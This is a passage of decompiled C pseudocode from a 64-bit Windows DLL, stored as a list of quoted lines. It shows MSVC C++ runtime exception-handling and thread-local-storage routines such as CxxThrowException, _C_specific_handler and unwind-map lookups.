    "  else if ( *v1 == -529697949 )",
    "  {",
    "    *(_QWORD *)(sub_180013A9C() + 32) = v1;",
    "    v5 = *(_QWORD *)(a1 + 8);",
    "    *(_QWORD *)(sub_180013A9C() + 40) = v5;",
    "    sub_1800230F8();",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "void  sub_18001359C()",
    "{",
    "  sub_1800230F8();",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800135A8(__int64 *a1, __int64 a2)",
    "{",
    "  __int64 v4; // rdi",
    "  __int64 v5; // rax",
    "  __int64 v6; // rbx",
    "  __int64 result; // rax",
    "",
    "  if ( *((_BYTE *)a1 + 8) && *a1 )",
    "  {",
    "    v4 = -1;",
    "    do",
    "      ++v4;",
    "    while ( *(_BYTE *)(*a1 + v4) );",
    "    v5 = sub_180020A84(v4 + 1);",
    "    v6 = v5;",
    "    if ( v5 )",
    "    {",
    "      sub_180023124(v5, v4 + 1, *a1);",
    "      *(_BYTE *)(a2 + 8) = 1;",
    "      *(_QWORD *)a2 = v6;",
    "      v6 = 0;",
    "    }",
    "    return sub_18001A2CC(v6);",
    "  }",
    "  else",
    "  {",
    "    result = *a1;",
    "    *(_QWORD *)a2 = *a1;",
    "    *(_BYTE *)(a2 + 8) = 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013638(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( *(_BYTE *)(a1 + 8) )",
    "    result = sub_18001A2CC(*(_QWORD *)a1);",
    "  *(_QWORD *)a1 = 0;",
    "  *(_BYTE *)(a1 + 8) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "void  sub_18001366C()",
    "{",
    "  void (*v0)(void); // rax",
    "  __int64 v1; // rdx",
    "  __int64 v2; // rcx",
    "  __int64 v3; // r8",
    "  __int64 v4; // r9",
    "",
    "  v0 = (void (*)(void))sub_180013660();",
    "  if ( v0 )",
    "    v0();",
    "  sub_1800219B0(v2, v1, v3, v4);",
    "}",
    "",
    "",
    "void __stdcall  CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo)",
    "{",
    "  _ThrowInfo *v2; // rbx",
    "  ULONG_PTR v4; // rdi",
    "  __int64 v5; // rcx",
    "  PVOID v6; // rax",
    "  PVOID BaseOfImage; // [rsp+20h] [rbp-38h] BYREF",
    "  ULONG_PTR Arguments[6]; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  v2 = pThrowInfo;",
    "  v4 = 429065504;",
    "  if ( pThrowInfo && (pThrowInfo->attributes & 0x10) != 0 )",
    "  {",
    "    v5 = *(_QWORD *)pExceptionObject - 8LL;",
    "    v2 = *(_ThrowInfo **)(*(_QWORD *)v5 + 48LL);",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 64LL))(v5);",
    "  }",
    "  v6 = 0;",
    "  BaseOfImage = 0;",
    "  if ( v2 )",
    "  {",
    "    v6 = RtlPcToFileHeader(v2, &BaseOfImage);",
    "    BaseOfImage = v6;",
    "    if ( (v2->attributes & 8) != 0 || !v6 )",
    "      v4 = 26820608;",
    "  }",
    "  Arguments[0] = v4;",
    "  Arguments[1] = (ULONG_PTR)pExceptionObject;",
    "  Arguments[2] = (ULONG_PTR)v2;",
    "  Arguments[3] = (ULONG_PTR)v6;",
    "  RaiseException(0xE06D7363, 1u, 4u, Arguments);",
    "}",
    "",
    "",
    "bool sub_180013730()",
    "{",
    "  __int64 v0; // rcx",
    "  bool result; // al",
    "",
    "  v0 = sub_180013B78();",
    "  result = 0;",
    "  if ( v0 )",
    "    return *(_DWORD *)(v0 + 48) > 0;",
    "  return result;",
    "}",
    "",
    "",
    "EXCEPTION_DISPOSITION __cdecl _C_specific_handler(",
    "        struct #70 *ExceptionRecord,",
    "        void *EstablisherFrame,",
    "        struct #55 *ContextRecord,",
    "        struct _DISPATCHER_CONTEXT *DispatcherContext)",
    "{",
    "  DWORD64 ImageBase; // r12",
    "  DWORD *HandlerData; // rbx",
    "  unsigned __int64 v10; // r14",
    "  DWORD ScopeIndex; // edi",
    "  int v12; // eax",
    "  unsigned __int64 v14; // rbp",
    "  DWORD i; // edx",
    "  __int64 v16; // rcx",
    "  DWORD v17; // r8d",
    "  _QWORD v18[2]; // [rsp+30h] [rbp-38h] BYREF",
    "",
    "  sub_180016DD4(ContextRecord);",
    "  ImageBase = DispatcherContext->ImageBase;",
    "  HandlerData = (DWORD *)DispatcherContext->HandlerData;",
    "  v10 = DispatcherContext->ControlPc - ImageBase;",
    "  ScopeIndex = DispatcherContext->ScopeIndex;",
    "  if ( (*((_BYTE *)ExceptionRecord + 4) & 0x66) != 0 )",
    "  {",
    "    v14 = DispatcherContext->TargetIp - ImageBase;",
    "    while ( 1 )",
    "    {",
    "      v17 = *HandlerData;",
    "      if ( ScopeIndex >= *HandlerData )",
    "        break;",
    "      if ( v10 >= HandlerData[4 * ScopeIndex + 1] && v10 < HandlerData[4 * ScopeIndex + 2] )",
    "      {",
    "        if ( (*((_BYTE *)ExceptionRecord + 4) & 0x20) != 0 )",
    "        {",
    "          for ( i = 0; i < v17; ++i )",
    "          {",
    "            if ( v14 >= HandlerData[4 * i + 1]",
    "              && v14 < HandlerData[4 * i + 2]",
    "              && HandlerData[4 * i + 4] == HandlerData[4 * ScopeIndex + 4]",
    "              && HandlerData[4 * i + 3] == HandlerData[4 * ScopeIndex + 3] )",
    "            {",
    "              break;",
    "            }",
    "          }",
    "          if ( i != *HandlerData )",
    "            return 1;",
    "        }",
    "        v16 = 2LL * ScopeIndex;",
    "        if ( HandlerData[4 * ScopeIndex + 4] )",
    "        {",
    "          if ( v14 == HandlerData[4 * ScopeIndex + 4] && (*((_BYTE *)ExceptionRecord + 4) & 0x20) != 0 )",
    "            return 1;",
    "        }",
    "        else",
    "        {",
    "          DispatcherContext->ScopeIndex = ScopeIndex + 1;",
    "          LOBYTE(v16) = 1;",
    "          ((void (__fastcall *)(__int64, void *))(ImageBase + HandlerData[4 * ScopeIndex + 3]))(v16, EstablisherFrame);",
    "        }",
    "      }",
    "      ++ScopeIndex;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v18[0] = ExceptionRecord;",
    "    v18[1] = ContextRecord;",
    "    while ( ScopeIndex < *HandlerData )",
    "    {",
    "      if ( v10 >= HandlerData[4 * ScopeIndex + 1]",
    "        && v10 < HandlerData[4 * ScopeIndex + 2]",
    "        && HandlerData[4 * ScopeIndex + 4] )",
    "      {",
    "        if ( HandlerData[4 * ScopeIndex + 3] == 1 )",
    "          goto LABEL_10;",
    "        v12 = ((__int64 (__fastcall *)(_QWORD *, void *))(ImageBase + HandlerData[4 * ScopeIndex + 3]))(",
    "                v18,",
    "                EstablisherFrame);",
    "        if ( v12 < 0 )",
    "          return 0;",
    "        if ( v12 > 0 )",
    "        {",
    "LABEL_10:",
    "          if ( *(_DWORD *)ExceptionRecord == -529697949 && sub_18001346C )",
    "          {",
    "            if ( (unsigned int)IsNonwritableInCurrentImage(&off_18003ACB8) )",
    "              sub_18001346C((__int64)ExceptionRecord);",
    "          }",
    "          sub_180016DA0(ImageBase + HandlerData[4 * ScopeIndex + 4], EstablisherFrame, 1);",
    "          RtlUnwindEx(",
    "            EstablisherFrame,",
    "            (PVOID)(ImageBase + HandlerData[4 * ScopeIndex + 4]),",
    "            (PEXCEPTION_RECORD)ExceptionRecord,",
    "            (PVOID)*(unsigned int *)ExceptionRecord,",
    "            DispatcherContext->ContextRecord,",
    "            DispatcherContext->HistoryTable);",
    "          nullsub_1();",
    "        }",
    "      }",
    "      ++ScopeIndex;",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_180013968()",
    "{",
    "  if ( !(unsigned __int8)sub_180016E0C() )",
    "    return 0;",
    "  if ( !(unsigned __int8)sub_180013BC8() )",
    "  {",
    "    sub_180016E54();",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool __fastcall Concurrency::details::ScheduleGroupSegmentBase::HasUnrealizedChores(#96 *this)",
    "{",
    "  return sub_180013AB8(this) != 0;",
    "}",
    "",
    "",
    "char sub_1800139A4()",
    "{",
    "  sub_180013A54();",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_1800139B4(char a1)",
    "{",
    "  if ( !a1 )",
    "  {",
    "    sub_180013C10();",
    "    sub_180016E54();",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_1800139D0()",
    "{",
    "  sub_180013C10();",
    "  return 1;",
    "}",
    "",
    "",
    "PSLIST_ENTRY __fastcall sub_180013A08(union _SLIST_HEADER *a1)",
    "{",
    "  PSLIST_ENTRY result; // rax",
    "  struct _SLIST_ENTRY *Next; // rbx",
    "",
    "  result = InterlockedFlushSList(a1);",
    "  if ( result )",
    "  {",
    "    do",
    "    {",
    "      Next = result->Next;",
    "      sub_18001A2CC(result);",
    "      result = Next;",
    "    }",
    "    while ( Next );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void *__fastcall sub_180013A34(void *a1)",
    "{",
    "  void *result; // rax",
    "",
    "  if ( a1 )",
    "  {",
    "    result = &unk_18004D170;",
    "    if ( a1 != &unk_18004D170 )",
    "      return (void *)sub_18001A2CC(a1);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void sub_180013A54()",
    "{",
    "  void *v0; // rbx",
    "",
    "  if ( (_DWORD)dword_18004B0F0 != -1 )",
    "  {",
    "    v0 = (void *)sub_18001706C();",
    "    sub_1800170B4((PCONTEXT)(unsigned int)dword_18004B0F0, 0);",
    "    if ( v0 )",
    "    {",
    "      if ( v0 != &unk_18004D170 )",
    "        sub_18001A2CC(v0);",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013A9C(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v2; // rdx",
    "  __int64 v3; // rcx",
    "  __int64 v4; // r8",
    "  __int64 v5; // r9",
    "",
    "  result = sub_180013AB8(a1);",
    "  if ( !result )",
    "    sub_1800219B0(v3, v2, v4, v5);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_180013AB8()",
    "{",
    "  DWORD LastError; // edi",
    "  __int64 v2; // rax",
    "  __int64 v3; // rsi",
    "  XSAVE_FORMAT *v4; // rax",
    "  struct _CONTEXT *v5; // rcx",
    "  XSAVE_FORMAT *v6; // rbx",
    "  XSAVE_FORMAT *v7; // rax",
    "",
    "  if ( (_DWORD)dword_18004B0F0 == -1 )",
    "    return 0;",
    "  LastError = GetLastError();",
    "  v2 = sub_18001706C((unsigned int)dword_18004B0F0);",
    "  v3 = 0;",
    "  if ( v2 != -1 )",
    "  {",
    "    if ( v2 )",
    "    {",
    "      v3 = v2;",
    "      goto LABEL_13;",
    "    }",
    "    if ( !(unsigned int)sub_1800170B4((PCONTEXT)(unsigned int)dword_18004B0F0, (XSAVE_FORMAT *)0xFFFFFFFFFFFFFFFFLL) )",
    "      goto LABEL_13;",
    "    v4 = (XSAVE_FORMAT *)sub_18001A730(1);",
    "    v5 = (struct _CONTEXT *)(unsigned int)dword_18004B0F0;",
    "    v6 = v4;",
    "    if ( v4 )",
    "    {",
    "      if ( (unsigned int)sub_1800170B4((PCONTEXT)(unsigned int)dword_18004B0F0, v4) )",
    "      {",
    "        v7 = v6;",
    "        LODWORD(v6->FloatRegisters[5].High) = -2;",
    "        v6 = 0;",
    "        v3 = (__int64)v7;",
    "LABEL_12:",
    "        sub_18001A2CC(v6);",
    "        goto LABEL_13;",
    "      }",
    "      v5 = (struct _CONTEXT *)(unsigned int)dword_18004B0F0;",
    "    }",
    "    sub_1800170B4(v5, 0);",
    "    goto LABEL_12;",
    "  }",
    "LABEL_13:",
    "  SetLastError(LastError);",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 sub_180013B78()",
    "{",
    "  DWORD LastError; // ebx",
    "  __int64 v2; // rdi",
    "",
    "  if ( (_DWORD)dword_18004B0F0 == -1 )",
    "    return 0;",
    "  LastError = GetLastError();",
    "  v2 = sub_18001706C((unsigned int)dword_18004B0F0);",
    "  SetLastError(LastError);",
    "  if ( v2 == -1 )",
    "    return 0;",
    "  return v2;",
    "}",
    "",
    "",
    "char sub_180013BC8()",
    "{",
    "  unsigned int v0; // eax",
    "",
    "  v0 = sub_180016FDC(sub_180013A34);",
    "  LODWORD(dword_18004B0F0) = v0;",
    "  if ( v0 != -1 )",
    "  {",
    "    if ( (unsigned int)sub_1800170B4((PCONTEXT)v0, (XSAVE_FORMAT *)&unk_18004D170) )",
    "    {",
    "      dword_18004D1E8 = -2;",
    "      return 1;",
    "    }",
    "    sub_180013C10();",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "char sub_180013C10()",
    "{",
    "  if ( (_DWORD)dword_18004B0F0 != -1 )",
    "  {",
    "    sub_180017024();",
    "    LODWORD(dword_18004B0F0) = -1;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013C34(_QWORD *a1, _QWORD *a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(unsigned int *)(*(int *)(a3 + 28) + *a1);",
    "  if ( (_DWORD)result == -2 )",
    "    return sub_180013CE0(a3, a2, *a2);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall __GetUnwindTryBlock(",
    "        unsigned __int64 *a1,",
    "        struct _xDISPATCHER_CONTEXT *a2,",
    "        const struct _s_FuncInfo *a3)",
    "{",
    "  __int64 v4; // rcx",
    "  __int64 dispUwindHelp; // rax",
    "  __int64 v7; // [rsp+40h] [rbp+18h] BYREF",
    "",
    "  v4 = *sub_180012AC0(a1, (ULONG64 *)a2, (__int64)a3, &v7);",
    "  dispUwindHelp = a3->dispUwindHelp;",
    "  v7 = v4;",
    "  return *(unsigned int *)(dispUwindHelp + v4 + 4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013C94(_QWORD *a1, ULONG64 *a2, __int64 a3, int a4)",
    "{",
    "  __int64 v6; // rcx",
    "  __int64 result; // rax",
    "  __int64 v8; // [rsp+40h] [rbp+18h] BYREF",
    "",
    "  v6 = *sub_180012AC0(a1, a2, a3, &v8);",
    "  result = *(int *)(a3 + 28);",
    "  v8 = v6;",
    "  if ( a4 > *(_DWORD *)(result + v6 + 4) )",
    "    *(_DWORD *)(result + v6 + 4) = a4;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013CD0(__int64 a1, _QWORD *a2)",
    "{",
    "  return sub_180013CE0(a1, a2, *a2);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013CE0(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4)",
    "{",
    "  __int64 v5; // r11",
    "  __int64 v6; // r10",
    "  unsigned int v7; // r8d",
    "  __int64 v8; // r9",
    "",
    "  if ( !a1 || (v5 = *(int *)(a1 + 24), v6 = *(_QWORD *)(a2 + 8), !(v6 + v5)) )",
    "    sub_1800219B0(a1, a2, a3, a4);",
    "  v7 = *(_DWORD *)(a1 + 20);",
    "  v8 = 0;",
    "  if ( !v7 )",
    "    return 0xFFFFFFFFLL;",
    "  do",
    "  {",
    "    if ( a3 < v6 + *(int *)(v5 + 8 * v8 + v6) )",
    "      break;",
    "    v8 = (unsigned int)(v8 + 1);",
    "  }",
    "  while ( (unsigned int)v8 < v7 );",
    "  if ( (_DWORD)v8 )",
    "    return *(unsigned int *)(v6 + 8LL * (unsigned int)(v8 - 1) + v5 + 4);",
    "  else",
    "    return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013D48(__int64 a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  __int64 v5; // rdi",
    "  unsigned int v6; // esi",
    "  _BYTE *v7; // r9",
    "  unsigned int v8; // r8d",
    "  unsigned int v9; // edx",
    "  __int64 v10; // rcx",
    "  _BYTE *v11; // r9",
    "  unsigned int v12; // r11d",
    "  __int64 v13; // r10",
    "  __int64 v14; // rcx",
    "  _BYTE *v15; // r9",
    "  __int64 v16; // rcx",
    "",
    "  if ( !*(_DWORD *)(a1 + 16) )",
    "    return 0xFFFFFFFFLL;",
    "  v5 = *(_QWORD *)(a2 + 8);",
    "  v6 = 0;",
    "  v7 = (_BYTE *)(v5 + *(int *)(a1 + 16));",
    "  v8 = 0;",
    "  v9 = -1;",
    "  v10 = *v7 & 0xF;",
    "  v11 = &v7[-byte_18003AB58[v10]];",
    "  v12 = *((_DWORD *)v11 - 1) >> byte_18003AB58[v10 + 16];",
    "  if ( !v12 )",
    "    return 0xFFFFFFFFLL;",
    "  v13 = **(unsigned int **)(a2 + 16);",
    "  do",
    "  {",
    "    v14 = *v11 & 0xF;",
    "    v15 = &v11[-byte_18003AB58[v14]];",
    "    v6 += *((_DWORD *)v15 - 1) >> byte_18003AB58[v14 + 16];",
    "    if ( a3 < v5 + v13 + (unsigned __int64)v6 )",
    "      break;",
    "    ++v8;",
    "    v16 = *v15 & 0xF;",
    "    v11 = &v15[-byte_18003AB58[v16]];",
    "    v9 = (*((_DWORD *)v11 - 1) >> byte_18003AB58[v16 + 16]) - 1;",
    "  }",
    "  while ( v8 < v12 );",
    "  if ( !v8 )",
    "    return (unsigned int)-1;",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013E38(__int64 a1, __int64 *a2, int *a3, __int64 a4)",
    "{",
    "  unsigned int v8; // edi",
    "  __int64 v9; // r15",
    "  __int64 v10; // rdx",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rax",
    "  __int64 v13; // rdx",
    "  __int64 v14; // rcx",
    "  __int64 v15; // r8",
    "  __int64 v16; // r9",
    "  __int64 v17; // rcx",
    "  __int64 v18; // rdx",
    "  __int64 v19; // rbx",
    "  __int64 v20; // rcx",
    "  __int64 v21; // rbx",
    "  __int64 v22; // rax",
    "",
    "  v8 = 0;",
    "  if ( a3[1] )",
    "  {",
    "    v9 = a3[1];",
    "    v10 = v9 + sub_1800132CC();",
    "  }",
    "  else",
    "  {",
    "    v10 = 0;",
    "    LODWORD(v9) = 0;",
    "  }",
    "  if ( v10 )",
    "  {",
    "    v11 = (_DWORD)v9 ? a3[1] + sub_1800132CC() : 0LL;",
    "    if ( *(_BYTE *)(v11 + 16) && (a3[2] || *a3 < 0) )",
    "    {",
    "      if ( *a3 >= 0 )",
    "        a2 = (__int64 *)(*a2 + a3[2]);",
    "      if ( *(char *)a3 < 0 && (*(_BYTE *)a4 & 0x10) != 0 && qword_18004D160 )",
    "      {",
    "        v12 = qword_18004D160();",
    "        if ( !v12 || !a2 )",
    "          sub_1800219B0(v14, v13, v15, v16);",
    "        *a2 = v12;",
    "        v17 = v12;",
    "      }",
    "      else if ( (*(_BYTE *)a3 & 8) != 0 )",
    "      {",
    "        v17 = *(_QWORD *)(a1 + 40);",
    "        if ( !v17 || !a2 )",
    "          sub_1800219B0(v17, v10, a3, a4);",
    "        *a2 = v17;",
    "      }",
    "      else",
    "      {",
    "        if ( (*(_BYTE *)a4 & 1) == 0 )",
    "        {",
    "          if ( *(_DWORD *)(a4 + 24) )",
    "          {",
    "            v19 = *(int *)(a4 + 24);",
    "            v20 = v19 + sub_1800132E0();",
    "          }",
    "          else",
    "          {",
    "            v20 = 0;",
    "            LODWORD(v19) = 0;",
    "          }",
    "          if ( v20 )",
    "          {",
    "            if ( !*(_QWORD *)(a1 + 40)",
    "              || !a2",
    "              || (!(_DWORD)v19 ? (v20 = 0) : (v20 = *(int *)(a4 + 24) + sub_1800132E0()), !v20) )",
    "            {",
    "              sub_1800219B0(v20, v10, a3, a4);",
    "            }",
    "            return (unsigned int)((*(_BYTE *)a4 & 4) != 0) + 1;",
    "          }",
    "          else",
    "          {",
    "            if ( !*(_QWORD *)(a1 + 40) || !a2 )",
    "              sub_1800219B0(0, v10, a3, a4);",
    "            v21 = *(int *)(a4 + 20);",
    "            v22 = _AdjustPointer(*(_QWORD *)(a1 + 40), a4 + 8);",
    "            sub_180036160(a2, v22, v21);",
    "          }",
    "          return v8;",
    "        }",
    "        v18 = *(_QWORD *)(a1 + 40);",
    "        if ( !v18 || !a2 )",
    "          sub_1800219B0(v11, v18, a3, a4);",
    "        sub_180036160(a2, v18, *(int *)(a4 + 20));",
    "        if ( *(_DWORD *)(a4 + 20) != 8 || !*a2 )",
    "          return v8;",
    "        v17 = *a2;",
    "      }",
    "      *a2 = _AdjustPointer(v17, a4 + 8);",
    "      return v8;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180014038(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)",
    "{",
    "  unsigned int v8; // edi",
    "  __int64 v9; // r15",
    "  __int64 v10; // rdx",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rax",
    "  __int64 v13; // rdx",
    "  __int64 v14; // rcx",
    "  __int64 v15; // r8",
    "  __int64 v16; // r9",
    "  __int64 v17; // rcx",
    "  __int64 v18; // rdx",
    "  __int64 v19; // rbx",
    "  __int64 v20; // rcx",
    "  __int64 v21; // rbx",
    "  __int64 v22; // rax",
    "",
    "  v8 = 0;",
    "  if ( *(_DWORD *)(a3 + 8) )",
    "  {",
    "    v9 = *(int *)(a3 + 8);",
    "    v10 = v9 + sub_1800132CC();",
    "  }",
    "  else",
    "  {",
    "    v10 = 0;",
    "    LODWORD(v9) = 0;",
    "  }",
    "  if ( v10 )",
    "  {",
    "    v11 = (_DWORD)v9 ? *(int *)(a3 + 8) + sub_1800132CC() : 0LL;",
    "    if ( *(_BYTE *)(v11 + 16) && (*(_DWORD *)(a3 + 12) || *(int *)(a3 + 4) < 0) )",
    "    {",
    "      if ( *(int *)(a3 + 4) >= 0 )",
    "        a2 = (__int64 *)(*a2 + *(unsigned int *)(a3 + 12));",
    "      if ( *(char *)(a3 + 4) < 0 && (*(_BYTE *)a4 & 0x10) != 0 && qword_18004D160 )",
    "      {",
    "        v12 = qword_18004D160();",
    "        if ( !v12 || !a2 )",
    "          sub_1800219B0(v14, v13, v15, v16);",
    "        *a2 = v12;",
    "        v17 = v12;",
    "      }",
    "      else if ( (*(_BYTE *)(a3 + 4) & 8) != 0 )",
    "      {",
    "        v17 = *(_QWORD *)(a1 + 40);",
    "        if ( !v17 || !a2 )",
    "          sub_1800219B0(v17, v10, a3, a4);",
    "        *a2 = v17;",
    "      }",
    "      else",
    "      {",
    "        if ( (*(_BYTE *)a4 & 1) == 0 )",
    "        {",
    "          if ( *(_DWORD *)(a4 + 24) )",
    "          {",
    "            v19 = *(int *)(a4 + 24);",
    "            v20 = v19 + sub_1800132E0();",
    "          }",
    "          else",
    "          {",
    "            v20 = 0;",
    "            LODWORD(v19) = 0;",
    "          }",
    "          if ( v20 )",
    "          {",
    "            if ( !*(_QWORD *)(a1 + 40)",
    "              || !a2",
    "              || (!(_DWORD)v19 ? (v20 = 0) : (v20 = *(int *)(a4 + 24) + sub_1800132E0()), !v20) )",
    "            {",
    "              sub_1800219B0(v20, v10, a3, a4);",
    "            }",
    "            return (unsigned int)((*(_BYTE *)a4 & 4) != 0) + 1;",
    "          }",
    "          else",
    "          {",
    "            if ( !*(_QWORD *)(a1 + 40) || !a2 )",
    "              sub_1800219B0(0, v10, a3, a4);",
    "            v21 = *(int *)(a4 + 20);",
    "            v22 = _AdjustPointer(*(_QWORD *)(a1 + 40), a4 + 8);",
    "            sub_180036160(a2, v22, v21);",
    "          }",
    "          return v8;",
    "        }",
    "        v18 = *(_QWORD *)(a1 + 40);",
    "        if ( !v18 || !a2 )",
    "          sub_1800219B0(v11, v18, a3, a4);",
    "        sub_180036160(a2, v18, *(int *)(a4 + 20));",
    "        if ( *(_DWORD *)(a4 + 20) != 8 || !*a2 )",
    "          return v8;",
    "        v17 = *a2;",
    "      }",
    "      *a2 = _AdjustPointer(v17, a4 + 8);",
    "      return v8;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001423C(__int64 a1, __int64 *a2, int *a3, __int64 a4)",
    "{",
    "  __int64 v6; // rbx",
    "  __int64 *v7; // rsi",
    "  __int64 result; // rax",
    "  __int64 v9; // r14",
    "  __int64 v10; // r14",
    "",
    "  v6 = 0;",
    "  if ( *a3 >= 0 )",
    "    v7 = (__int64 *)(*a2 + a3[2]);",
    "  else",
    "    v7 = a2;",
    "  result = (unsigned int)sub_180013E38(a1, a2, a3, a4) - 1;",
    "  if ( (_DWORD)result )",
    "  {",
    "    if ( (_DWORD)result == 1 )",
    "    {",
    "      v9 = _AdjustPointer(*(_QWORD *)(a1 + 40), a4 + 8);",
    "      if ( *(_DWORD *)(a4 + 24) )",
    "        v6 = sub_1800132E0() + *(int *)(a4 + 24);",
    "      return sub_180016BE0(v7, v6, v9, 1);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v10 = _AdjustPointer(*(_QWORD *)(a1 + 40), a4 + 8);",
    "    if ( *(_DWORD *)(a4 + 24) )",
    "      v6 = sub_1800132E0() + *(int *)(a4 + 24);",
    "    return sub_180016BD4(v7, v6, v10);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800142FC(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v6; // rbx",
    "  __int64 *v7; // rsi",
    "  __int64 result; // rax",
    "  __int64 v9; // r14",
    "  __int64 v10; // r14",
    "",
    "  v6 = 0;",
    "  if ( *(int *)(a3 + 4) >= 0 )",
    "    v7 = (__int64 *)(*a2 + *(unsigned int *)(a3 + 12));",
    "  else",
    "    v7 = a2;",
    "  result = (unsigned int)sub_180014038(a1, a2, a3, a4) - 1;",
    "  if ( (_DWORD)result )",
    "  {",
    "    if ( (_DWORD)result == 1 )",
    "    {",
    "      v9 = _AdjustPointer(*(_QWORD *)(a1 + 40), a4 + 8);",
    "      if ( *(_DWORD *)(a4 + 24) )",
    "        v6 = sub_1800132E0() + *(int *)(a4 + 24);",
    "      return sub_180016BE0(v7, v6, v9, 1);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v10 = _AdjustPointer(*(_QWORD *)(a1 + 40), a4 + 8);",
    "    if ( *(_DWORD *)(a4 + 24) )",
    "      v6 = sub_1800132E0() + *(int *)(a4 + 24);",
    "    return sub_180016BD4(v7, v6, v10);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_1800143C0(",
    "        __int64 a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        ULONG64 *a4,",
    "        __int64 a5,",
    "        int *a6,",
    "        __int64 a7,",
    "        int *a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        unsigned __int8 a12)",
    "{",
    "  __int64 v12; // r13",
    "  __int64 *v16; // rax",
    "  __int64 v17; // r14",
    "  int *v18; // rsi",
    "  int v19; // ebx",
    "  int v20; // edi",
    "  __int64 v21; // rax",
    "  __int64 v22; // [rsp+A8h] [rbp+10h] BYREF",
    "  __int64 v23; // [rsp+B0h] [rbp+18h]",
    "",
    "  v23 = a3;",
    "  v12 = a5;",
    "  v16 = sub_180012AC0(a2, a4, a5, &v22);",
    "  v17 = (__int64)v16;",
    "  v18 = a6;",
    "  if ( a7 )",
    "    sub_18001423C(a1, v16, a6, a7);",
    "  v19 = a8[2];",
    "  v20 = *a8;",
    "  v21 = sub_1800132CC();",
    "  sub_180012E54(a2, a1, v23, v17, v18[3] + v21, v12, v20, v19, (int)v18, (__int64)a4, a12);",
    "}",
    "",
    "",
    "void __fastcall sub_180014494(",
    "        __int64 a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        __int64 a7,",
    "        int *a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        unsigned __int8 a12)",
    "{",
    "  int v12; // r13d",
    "  __int64 *v16; // rax",
    "  __int64 v17; // r14",
    "  __int64 v18; // rsi",
    "  int v19; // ebx",
    "  int v20; // edi",
    "  __int64 v21; // rax",
    "  __int64 v22; // [rsp+A8h] [rbp+10h] BYREF",
    "  __int64 v23; // [rsp+B0h] [rbp+18h]",
    "",
    "  v23 = a3;",
    "  v12 = a5;",
    "  v16 = (__int64 *)sub_180012B90(a2, a4, a5, &v22);",
    "  v17 = (__int64)v16;",
    "  v18 = a6;",
    "  if ( a7 )",
    "    sub_1800142FC(a1, v16, a6, a7);",
    "  v19 = a8[2];",
    "  v20 = *a8;",
    "  v21 = sub_1800132CC();",
    "  sub_180012F58(a2, a1, v23, v17, *(int *)(v18 + 16) + v21, v12, v20, v19, v18, a4, a12);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180014568(",
    "        __int64 a1,",
    "        unsigned __int64 *a2,",
    "        __int64 a3,",
    "        struct _xDISPATCHER_CONTEXT *a4,",
    "        struct _s_FuncInfo *a5,",
    "        unsigned __int8 a6,",
    "        int a7,",
    "        __int64 a8)",
    "{",
    "  unsigned __int64 *v8; // r12",
    "  __int64 v9; // r15",
    "  int v12; // eax",
    "  __int64 v13; // rdx",
    "  __int64 dispESTypeList; // rcx",
    "  __int64 v15; // r8",
    "  __int64 v16; // r9",
    "  int v17; // r14d",
    "  __int64 result; // rax",
    "  __int64 v19; // rcx",
    "  __int64 v20; // rcx",
    "  __int64 v21; // r15",
    "  __int64 v22; // rcx",
    "  unsigned int v23; // r15d",
    "  __int64 v24; // r9",
    "  __int64 v25; // rax",
    "  __int64 v26; // r8",
    "  __m128i v27; // xmm0",
    "  __int64 v28; // r12",
    "  unsigned __int64 v29; // xmm0_8",
    "  __int64 v30; // rax",
    "  int i; // r13d",
    "  __int64 v32; // rax",
    "  __int64 v33; // r8",
    "  __int64 v34; // rax",
    "  __int64 v35; // rdx",
    "  _QWORD *v36; // rax",
